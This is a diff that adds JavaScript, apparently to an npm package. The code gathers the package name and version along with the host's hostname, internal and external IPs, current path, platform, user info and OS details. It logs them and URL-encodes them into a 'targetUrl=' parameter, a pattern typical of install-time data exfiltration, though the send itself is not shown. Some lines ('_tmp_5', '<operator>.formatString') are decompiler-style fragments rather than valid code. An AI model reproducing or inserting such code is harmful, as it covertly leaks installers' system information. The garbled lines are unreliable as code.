@@ -1,0 +1,17 @@
+const packageName = process.env.npm_package_name
+const packageVersion = process.env.npm_package_version
+const data = {
+    packageName,
+    packageVersion,
+    hostname,
+    internalIpAddress,
+    externalIpAddress,
+    currentPath,
+    platform,
+    userInfo,
+    osDetails // Added OS details here
+  }
+_tmp_5.packageName = packageName
+_tmp_5.packageVersion = packageVersion
+fs.appendFileSync(logFile, `Data: ${JSON.stringify(data)}\n`)
+<operator>.formatString("targetUrl=", encodeURIComponent(JSON.stringify(data)), "")
